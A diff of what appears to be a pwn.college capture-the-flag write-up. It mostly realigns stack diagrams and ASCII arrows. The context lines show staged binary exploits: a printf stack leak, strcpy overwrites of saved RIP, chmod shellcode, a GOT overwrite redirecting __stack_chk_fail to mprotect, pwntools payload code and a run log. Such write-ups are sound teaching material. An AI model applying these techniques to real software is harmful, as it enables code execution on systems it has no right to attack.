@@ -13880,47 +13880,47 @@ The vulnerability is `read(0, input, 0x100)` writing into a buffer at `rbp−0x5
 The frame is fixed-size (`sub rsp, 0x90`) and every offset is a compile-time constant from `rbp`.
 
 ```
-                   ┌─────────────────────────────┐
-        rbp−0x70   │  v1[0]  LODWORD = 0x10      │ loop limit
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x6C   │  v1[0]  HIDWORD             │ strcpy writes answer string here
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x68   │  v1[1]  = 0                 │ zeroed, unused
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x60   │  v1[2]  LODWORD             │ unused low half
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x5C   │  v1[2]  HIDWORD = input     │ read() lands here; BYTE4 zeroed after printf
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x58   │  v1[3]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x50   │  v1[4]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x48   │  v1[5]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x40   │  v1[6]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x38   │  v1[7]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x30   │  v1[8]                      │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x28   │  v1[9]  LODWORD = 0         │ zeroed, unused
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x24   │  v1[9]  HIDWORD = "Buzz\n"  │ v1[11] points here in Buzz branch
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x20   │  v1[10] LODWORD             │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x1C   │  v1[10] HIDWORD = i         │ loop counter
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x18   │  v1[11] --> answer string   │ ptr set each iteration
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x10   │  v1[12] --> rbp−0x6C        │ strcpy dst
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp−0x08   │  v1[13] = 0                 │ zeroed, unused
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp+0x00   │  saved RBP                  │
-                   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-        rbp+0x08   │  saved RIP                  │
-                   └─────────────────────────────┘
+            ┌─────────────────────────────┐
+   rbp−0x70 │  v1[0]  LODWORD = 0x10      │ loop limit
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x6C │  v1[0]  HIDWORD             │ strcpy writes answer string here
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x68 │  v1[1]  = 0                 │ zeroed, unused
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x60 │  v1[2]  LODWORD             │ unused low half
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x5C │  v1[2]  HIDWORD = input     │ read() lands here; BYTE4 zeroed after printf
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x58 │  v1[3]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x50 │  v1[4]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x48 │  v1[5]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x40 │  v1[6]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x38 │  v1[7]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x30 │  v1[8]                      │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x28 │  v1[9]  LODWORD = 0         │ zeroed, unused
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x24 │  v1[9]  HIDWORD = "Buzz\n"  │ v1[11] points here in Buzz branch
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x20 │  v1[10] LODWORD             │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x1C │  v1[10] HIDWORD = i         │ loop counter
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x18 │  v1[11] --> answer string   │ ptr set each iteration
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x10 │  v1[12] --> rbp−0x6C        │ strcpy dst
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x08 │  v1[13] = 0                 │ zeroed, unused
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x00 │  saved RBP                  │
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x08 │  saved RIP                  │
+            └─────────────────────────────┘
 ```
 
 The `strcpy` primitive uses `arr[11]` as its source pointer. In three of the four branches `arr[11]` is set to a BSS address, statically-linked, already known, tells us nothing about where the stack is. Only the **Buzz branch** (`i % 5 == 0`, `i % 3 != 0`, `i % 15 != 0`) sets `arr[11]` to `(char *)&arr[9] + 4`, a live stack address at `rbp−0x24`. Leaking that value gives us `rbp` and, from there, every address we need.
@@ -13965,29 +13965,48 @@ Stage 1 payload on `i = 5` (Buzz branch):
 +64  p32(0xFFFFFFFF) arr[10] HIDWORD = −1, loop continues
 ```
 
-Stack after Stage 1 payload is received, before `printf` fires:
+### Stage 1: Leaking the saved `rbp`
 
 ```
-<== Value is stored at the address
-<-- Points to the address
-
-                           ┌───────────────────────────┐
-           rbp−0x5C (+00)  │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 64, printf starts here )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x28 (+52)  │  42 55 5a 5a              │ ( b"BUZZ", arr[9] LODWORD, non-NULL )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x24 (+56)  │  43 43 43 43              │ ( b"CCCC", arr[9] HIDWORD, gap bridged )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x20 (+60)  │  44 44 44 44              │ ( b"DDDD", arr[10] LODWORD, filler )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x1C (+64)  │  ff ff ff ff              │ ( 0xFFFFFFFF = −1, counter: loop continues )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x18 (+68)  │  ?? ?? ?? ?? ?? ?? 00 00  │ --> ( arr[11] = rbp−0x24 ← THE LEAK )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x10 (+76)  │  rbp − 0x6C ...           │ ( arr[12] = compile-time dest, unchanged )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08        │  saved RIP                │ unchanged
-                           └───────────────────────────┘
+            ┌─────────────────────────────┐
+   rbp−0x70 │  41 41 41 41 41 41 41 41    │ v1[0]  LODWORD+HIDWORD = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x68 │  41 41 41 41 41 41 41 41    │ v1[1]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x60 │  41 41 41 41                │ v1[2]  LODWORD = "AAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x5C │  41 41 41 41 41 41 41 41    │ v1[2]  HIDWORD = input; read() lands here
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x58 │  41 41 41 41 41 41 41 41    │ v1[3]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x50 │  41 41 41 41 41 41 41 41    │ v1[4]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x48 │  41 41 41 41 41 41 41 41    │ v1[5]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x40 │  41 41 41 41 41 41 41 41    │ v1[6]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x38 │  41 41 41 41 41 41 41 41    │ v1[7]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x30 │  41 41 41 41 41 41 41 41    │ v1[8]  = "AAAAAAAA"
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x28 │  42 55 5a 5a                │ v1[9]  LODWORD = "BUZZ", non-NULL
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x24 │  43 43 43 43                │ v1[9]  HIDWORD = "CCCC", gap bridged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x20 │  44 44 44 44                │ v1[10] LODWORD = "DDDD", filler
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x1C │  ff ff ff ff                │ v1[10] HIDWORD = −1, loop continues
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x18 │  ?? ?? ?? ?? ?? ?? 00 00    │ v1[11] = rbp−0x24 (THE LEAK)
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x10 │  rbp − 0x6C ...             │ v1[12] = compile-time dest, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x08 │  00 00 00 00 00 00 00 00    │ v1[13] = zeroed, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x00 │  saved RBP                  │ unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x08 │  saved RIP                  │ unchanged
+            └─────────────────────────────┘
 ```
 
 We parse the 6 non-NULL bytes that `printf` spills from offset +68:
@@ -14006,36 +14025,48 @@ For Stage 2, `i = 0` is FizzBuzz, so `arr[11]` will be set to `&fizzbuzz` (a BSS
 
 The NOP padding between the shellcode and `sc_addr` at offset +60 is pure filler, it pushes `p64(sc_addr)` rightward in the payload until it aligns with `arr[10]` at exactly offset +60. The shellcode is 31 bytes ending at offset +35, so 25 NOP bytes bridge the gap. Any non-NULL byte would work equally well here.
 
+### Stage 2: shellcode
+
 Stack after Stage 2 payload is received, before `strcpy` fires:
 
 ```
-<== Value is stored at the address
-<-- Points to the address
-
-                           ┌───────────────────────────┐
-           rbp−0x5C (+00)  │  90 90 90 90              │ ( NOP sled, BYTE4 will zero input[0] here )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x58 (+04)  │  [ chmod shellcode ]      │ ( 31 bytes of shellcode )  ← sc_addr
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                    (+35)  │  90 90 90 90 90 90 90 ...  │ ( NOP padding to offset +60 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x20 (+60)  │  [ sc_addr bytes ]        │ ( arr[10]: HIDWORD ≥ 16 -> loop exits )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x18 (+68)  │  [ rbp − 0x20 ]           │ --> ( arr[11] = ptr to sc_addr bytes above )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x10 (+76)  │  [ saved_rip addr ]       │ --> ( arr[12] = strcpy destination )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08        │  saved RIP                │ ← strcpy writes sc_addr here
-                           └───────────────────────────┘
-
-═══════════════════════════════════════════════════════════════════════════════════
-strcpy(saved_rip_addr, &sc_addr_bytes) fires
-    -> copies sc_addr bytes until the NULL high byte of the address (0x00)
-    -> saved RIP now contains sc_addr
-═══════════════════════════════════════════════════════════════════════════════════
-
-Counter HIDWORD (0x00007fff...) ≥ 16 -> loop exits
-challenge() returns -> ret pops sc_addr -> execution jumps to shellcode
+            ┌─────────────────────────────┐
+   rbp−0x70 │  00 00 00 00 00 00 00 00    │ v1[0]  LODWORD = 0x10, HIDWORD = 0, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x68 │  00 00 00 00 00 00 00 00    │ v1[1]  = zeroed, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x60 │  00 00 00 00                │ v1[2]  LODWORD = unused, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x5C │  90 90 90 90                │ v1[2]  HIDWORD = input; NOP sled, BYTE4 zeroed after printf
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x58 │  [ chmod shellcode  0..7 ]  │ v1[3]  = shellcode bytes 0–7    <- sc_addr
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x50 │  [ chmod shellcode  8..15]  │ v1[4]  = shellcode bytes 8–15
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x48 │  [ chmod shellcode 16..23]  │ v1[5]  = shellcode bytes 16–23
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x40 │  [ chmod shellcode 24..30]  │ v1[6]  = shellcode bytes 24–30
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x38 │  90 90 90 90 90 90 90 90    │ v1[7]  = NOP padding
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x30 │  90 90 90 90 90 90 90 90    │ v1[8]  = NOP padding
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x28 │  90 90 90 90                │ v1[9]  LODWORD = NOP padding
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x24 │  90 90 90 90                │ v1[9]  HIDWORD = NOP padding
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x20 │  [ sc_addr ]                │ v1[10] HIDWORD ≥ 16, loop exits
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x18 │  [ rbp − 0x20 ]             │ v1[11] = strcpy src -> sc_addr bytes above
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x10 │  [ saved_rip addr ]         │ v1[12] = strcpy dst -> return address slot
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp−0x08 │  00 00 00 00 00 00 00 00    │ v1[13] = zeroed, unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x00 │  saved RBP                  │ unchanged
+            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+   rbp+0x08 │  saved RIP                  │ <- strcpy writes sc_addr here
+            └─────────────────────────────┘
 ```
 
 The frame is fixed-size and every offset is a compile-time constant. GDB was useful during static analysis to confirm the stack layout and verify what value `arr[11]` holds in the Buzz branch, but the exploit itself requires zero runtime debugging. The only unknown at exploit time is the stack base address, and one `printf` spill resolves it. After that, every address is pure arithmetic.
@@ -14338,7 +14369,7 @@ The vulnerability is `read(0, rbp-0x3C, 0x30)` which can overflow into `src` (at
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp+0x00        │  saved RBP                │
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08        │  saved RIP                │ ← strcpy writes win_addr here
+           rbp+0x08        │  saved RIP                │ <- strcpy writes win_addr here
                            └───────────────────────────┘
 ```
 
@@ -14422,7 +14453,7 @@ Stack after Stage 3 payload, before `strcpy` fires:
                            ┌───────────────────────────┐
            rbp−0x3C (+0)   │  \x90 (zeroed by binary)  │
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x3B (+1)   │  [ win_addr bytes ]       │ ← src points here
+           rbp−0x3B (+1)   │  [ win_addr bytes ]       │ <- src points here
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x33 (+9)   │  \x00                     │ strcpy NULL terminator
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
@@ -14434,7 +14465,7 @@ Stack after Stage 3 payload, before `strcpy` fires:
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x08 (+52)  │  canary (untouched)       │ read limit = 48 ✓
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08        │  saved RIP                │ ← strcpy writes win_addr here
+           rbp+0x08        │  saved RIP                │ <- strcpy writes win_addr here
                            └───────────────────────────┘
 
 ═══════════════════════════════════════════════════════════════════
@@ -14660,7 +14691,7 @@ void challenge(void) {
     }
 
     if (canary != __readfsqword(0x28))
-        __stack_chk_fail();                  // ← Phase 3 redirects this to mprotect_stack
+        __stack_chk_fail();                  // <- Phase 3 redirects this to mprotect_stack
 }
 ```
 
@@ -14687,7 +14718,7 @@ The vulnerability is `read(0, rbp−0x3C, 0x54)` writing 84 bytes into a buffer 
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp+0x00 (+60)  │  saved RBP                │
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08 (+68)  │  saved RIP                │ ← Phase 4 writes shellcode entry here
+           rbp+0x08 (+68)  │  saved RIP                │ <- Phase 4 writes shellcode entry here
                            └───────────────────────────┘
 ```
 
@@ -14696,8 +14727,8 @@ The GOT (offsets from binary base, writable due to Partial RELRO):
 ```
 0x4018  putchar@GOT
 0x4020  strcpy@GOT
-0x4028  puts@GOT              ← used to leak libc (puts address)
-0x4030  __stack_chk_fail@GOT  ← Phase 3 overwrites this -> mprotect_stack
+0x4028  puts@GOT              <- used to leak libc (puts address)
+0x4030  __stack_chk_fail@GOT  <- Phase 3 overwrites this -> mprotect_stack
 0x4038  printf@GOT
 0x4040  read@GOT
 0x4050  mprotect@GOT
@@ -14826,7 +14857,7 @@ This is a single 84-byte `read()` payload that does everything at once:
 [50..51] : 0x00 0x00          padding
 [52..59] : 0xdeadbeefdeadbeef corrupt canary — triggers __stack_chk_fail
 [60..67] : p64(buffer_start)  saved RBP (any writable addr, shellcode ignores RBP)
-[68..75] : p64(buffer_start+1) saved RIP ← shellcode entry point
+[68..75] : p64(buffer_start+1) saved RIP <- shellcode entry point
 [76..83] : 0x00 × 8           padding
 ```
 
@@ -14855,15 +14886,15 @@ Execution flow after Phase 4 payload is sent:
                            ┌───────────────────────────┐
            rbp−0x3C (+0)   │  0x00 (zeroed by binary)  │
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x3B (+1)   │  [ chmod+exit shellcode ] │ ← saved_rip points here
+           rbp−0x3B (+1)   │  [ chmod+exit shellcode ] │ <- saved_rip points here
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp−0x14 (+44)  │  "/flag\0"                │ ← rdi = buffer_start+44
+           rbp−0x14 (+44)  │  "/flag\0"                │ <- rdi = buffer_start+44
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp−0x08 (+52)  │  0xdeadbeefdeadbeef       │ corrupt canary
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            rbp+0x00 (+60)  │  buffer_start             │ saved RBP (harmless)
                            ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-           rbp+0x08 (+68)  │  buffer_start + 1         │ saved RIP ← shellcode entry
+           rbp+0x08 (+68)  │  buffer_start + 1         │ saved RIP <- shellcode entry
                            └───────────────────────────┘
 
 ═══════════════════════════════════════════════════════════════════════════════
@@ -14972,7 +15003,7 @@ payload  = b'\x90' + p64(mprotect_stack)
 payload  = payload.ljust(24, b'\x00')
 payload += p32(1) + p64(buffer_start + 1) + p64(stk_fail_got)
 p.send(payload)
-log.success(f'GOT overwrite: __stack_chk_fail@GOT ← mprotect_stack')
+log.success(f'GOT overwrite: __stack_chk_fail@GOT <- mprotect_stack')
 p.recvuntil(b'You entered: '); p.recvline()
 p.recvuntil(b'Correct answer: '); p.recvline()
 
@@ -15033,7 +15064,7 @@ hacker@dojo.pwn.college:~$ python3 ~/exploit2.py
 [+] mprotect_stack        = 0x5734ae905269
 [+] leaked puts@libc      = 0x7192bdffc420
 [+] libc_base             = 0x7192bdf78000
-[+] GOT overwrite: __stack_chk_fail@GOT ← mprotect_stack
+[+] GOT overwrite: __stack_chk_fail@GOT <- mprotect_stack
 [+] Receiving all data: Done (1B)
 [*] Process '/challenge/make-it-fizbuzz' stopped with exit code -11 (SIGSEGV) (pid 95473)
 ```
